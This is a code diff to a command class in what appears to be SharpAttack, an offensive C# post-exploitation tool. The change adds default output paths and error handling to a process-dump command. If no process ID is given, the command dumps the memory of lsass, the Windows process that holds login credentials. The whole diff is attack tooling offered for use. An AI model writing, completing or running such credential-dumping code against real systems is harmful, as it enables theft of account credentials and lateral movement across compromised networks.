@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using SharpSploit.Enumeration;
 
+using SharpAttack.Utils;
 namespace SharpAttack.Commands
 {
   class DumpProcess : Command
@@ -10,8 +11,8 @@ namespace SharpAttack.Commands
     public override void Run(Dictionary<String, Parameter> RunParams)
     {
       int id = -1;
-      string OutputPath = null;
-      string OutputName = null;
+      string OutputPath = Host.GetCurrentDirectory();
+      string OutputName = "output.bin";
 
       if (RunParams.TryGetValue("PID", out Parameter pid))
       {
@@ -30,11 +31,27 @@ namespace SharpAttack.Commands
 
       if (id < 0)
       {
-        Host.CreateProcessDump("lsass", OutputPath, OutputName);
+        try
+        {
+          Host.CreateProcessDump("lsass", OutputPath, OutputName);
+          Printing.Success($"Dump created at {OutputPath}\\{OutputName}");
+        }
+        catch
+        {
+          Printing.Error($"Error creating process dump.");
+        }
       }
       else
       {
-        Host.CreateProcessDump(id, OutputPath, OutputName);
+        try
+        {
+          Host.CreateProcessDump(id, OutputPath, OutputName);
+          Printing.Success($"Dump created at {OutputPath}\\{OutputName}");
+        }
+        catch
+        {
+          Printing.Error($"Error creating process dump.");
+        }
       }
     }
 
